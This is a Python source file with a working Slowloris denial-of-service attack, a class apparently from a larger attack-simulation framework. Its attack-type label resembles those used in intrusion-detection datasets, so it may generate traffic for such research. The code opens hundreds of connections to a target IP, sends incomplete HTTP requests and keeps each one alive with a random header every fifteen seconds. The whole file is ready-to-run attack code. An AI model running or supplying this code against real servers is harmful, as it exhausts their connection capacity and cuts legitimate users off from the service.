"""Slowloris DoS attack implementation"""

import asyncio
import logging
import random
from .base_attack import BaseAttack

logger = logging.getLogger(__name__)


class DoSSlowloris(BaseAttack):
    """Slowloris DoS attack - keeps connections open with slow HTTP requests"""
    
    def get_attack_type(self) -> str:
        return "DoS attacks-Slowloris"
    
    def get_default_port(self) -> int:
        return 80
    
    async def _execute_attack(self):
        """Execute Slowloris attack"""
        port = self.target_port or self.get_default_port()
        num_sockets = self.parameters.get('num_sockets', 200)
        duration = self.parameters.get('duration', 300)  # seconds
        
        logger.info(f"Slowloris: Opening {num_sockets} connections to {self.target_ip}:{port}")
        
        sockets = []
        
        try:
            # Open connections
            for i in range(num_sockets):
                try:
                    reader, writer = await asyncio.open_connection(self.target_ip, port)
                    
                    # Send incomplete HTTP request
                    writer.write(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    writer.write(f"User-Agent: Mozilla/5.0\r\n".encode())
                    writer.write(f"Accept: */*\r\n".encode())
                    await writer.drain()
                    
                    sockets.append(writer)
                    self.packets_sent += 3
                    
                    if i % 50 == 0:
                        logger.info(f"Slowloris: Opened {i}/{num_sockets} connections")
                    
                    await asyncio.sleep(0.01)
                    
                except Exception as e:
                    logger.debug(f"Failed to open connection {i}: {e}")
            
            logger.info(f"Slowloris: {len(sockets)} connections established")
            
            # Keep connections alive
            start_time = asyncio.get_event_loop().time()
            while (asyncio.get_event_loop().time() - start_time) < duration:
                for writer in sockets:
                    try:
                        writer.write(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        await writer.drain()
                        self.packets_sent += 1
                    except Exception:
                        pass
                
                await asyncio.sleep(15)  # Send header every 15 seconds
                
        finally:
            # Close all connections
            for writer in sockets:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass
            
            logger.info(f"Slowloris: Closed all connections")

